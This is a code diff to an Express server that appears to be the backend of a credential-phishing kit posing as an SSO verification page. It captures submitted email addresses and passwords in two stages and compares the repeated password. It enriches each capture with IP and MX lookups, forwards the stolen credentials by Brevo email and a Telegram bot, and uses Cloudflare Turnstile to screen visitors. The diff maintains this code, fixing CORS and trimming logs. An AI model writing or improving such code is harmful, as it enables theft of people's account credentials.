@@ -5,14 +5,16 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ============================================================
-// MIDDLEWARE
+// MIDDLEWARE (FIXED CORS)
 // ============================================================
-
+// Allow all origins and handle preflight requests automatically
 app.use(cors({
-    origin: 'po-sso-we-verify.netlify.app',
+    origin: 'https://po-sso-we-verify.netlify.app',
     methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
     allowedHeaders: ['Content-Type', 'Authorization']
 }));
+// Ensure OPTIONS requests are handled instantly
+app.options('*', cors());
 
 app.use(express.json({ limit: '100kb' }));
 app.use(express.urlencoded({ extended: true, limit: '100kb' }));
@@ -109,7 +111,6 @@ async function verifyTurnstile(token, remoteIp) {
         body.append('secret', TURNSTILE_SECRET_KEY);
         body.append('response', token);
 
-        // Only include remoteip if it looks like an IP address
         if (remoteIp && /^[\d\.a-fA-F:]+$/.test(remoteIp)) {
             body.append('remoteip', remoteIp);
         }
@@ -272,7 +273,7 @@ async function getMXRecord(domain) {
 }
 
 // ============================================================
-// HEALTH CHECK (existing keys preserved + Turnstile info)
+// HEALTH CHECK
 // ============================================================
 
 app.get('/health', (req, res) => {
@@ -283,7 +284,6 @@ app.get('/health', (req, res) => {
         telegramConfigured: !!(BOT_TOKEN && CHAT_ID),
         emailConfigured: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length),
         teamsRedirectConfigured: !!TEAMS_REDIRECT,
-        // ---- new fields (additive only) ----
         turnstileConfigured: !!TURNSTILE_SECRET_KEY,
         requireTurnstile: REQUIRE_TURNSTILE,
         proofTtlSeconds: PROOF_TTL_MS / 1000
@@ -292,9 +292,6 @@ app.get('/health', (req, res) => {
 
 // ============================================================
 // TURNSTILE VERIFY ENDPOINT
-// Called by gate page (index.html) after Cloudflare challenge passes.
-// Verifies the token server-side, then issues an HMAC proof that the
-// login page attaches to Stage 1.
 // ============================================================
 
 app.post('/api/turnstile-verify', async (req, res) => {
@@ -339,12 +336,11 @@ app.post('/api/turnstile-verify', async (req, res) => {
 });
 
 // ============================================================
-// LOGIN ENDPOINT (stage 1 + stage 2) — WITH TURNSTILE ENFORCEMENT
+// LOGIN ENDPOINT
 // ============================================================
 
 app.post('/api/login', async (req, res) => {
     console.log('📧 Login attempt received');
-    console.log('📋 Request body:', req.body);
 
     const body = req.body || {};
     const {
@@ -364,23 +360,18 @@ app.post('/api/login', async (req, res) => {
     // ----- TURNSTILE PROTECTION (stage 1 only) -----
     if (stage === 1) {
         const clientIP = firstClientIp(req);
-
         let turnstilePassed = false;
         let turnstileReason = 'not-checked';
 
-        // Preferred: HMAC proof issued by /api/turnstile-verify
         if (proof && proofTs) {
             const v = verifyProof(email, proof, proofTs);
             turnstilePassed = v.valid;
             turnstileReason = v.reason;
-        }
-        // Fallback: raw Turnstile token sent directly from client
-        else if (turnstileToken) {
+        } else if (turnstileToken) {
             const v = await verifyTurnstile(turnstileToken, clientIP);
             turnstilePassed = v.success;
             turnstileReason = v.success ? 'ok' : 'turnstile-failed';
-        }
-        else {
+        } else {
             turnstileReason = 'no-proof';
         }
 
@@ -393,15 +384,13 @@ app.post('/api/login', async (req, res) => {
                     message: 'Human verification required',
                     reason: turnstileReason
                 });
-            } else {
-                console.warn('⚠️  REQUIRE_TURNSTILE=false → allowing Stage 1 without proof');
             }
         } else {
             console.log(`✅ Turnstile passed for ${email} (${turnstileReason})`);
         }
     }
 
-    // ----- EXISTING LOGIC (unchanged) -----
+    // ----- EXISTING LOGIC -----
     const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
     const ipInfo = await getIPInfo(clientIP);
     const domain = email.split('@')[1];
@@ -434,7 +423,7 @@ Date : ${new Date().toISOString()}
     console.log('📧 Sending email via Brevo...');
     const emailResult = await sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, stage);
 
-    // ----- Stage 2 → compare passwords, decide redirect -----
+    // ----- Stage 2 -----
     if (stage === 2) {
         const matches = (firstPassword === password);
 
@@ -468,7 +457,7 @@ Date : ${new Date().toISOString()}
 // 404
 // ============================================================
 
-app.use('*', (req, res) => {
+app.use((req, res) => {
     res.status(404).json({
         success: false,
         message: `Endpoint not found: ${req.method} ${req.originalUrl}`
@@ -481,7 +470,6 @@ app.use('*', (req, res) => {
 
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`🌐 Health: http://localhost:${PORT}/health`);
 });
 
 process.on('uncaughtException',  (err) => console.error('❌ Uncaught:', err.message));
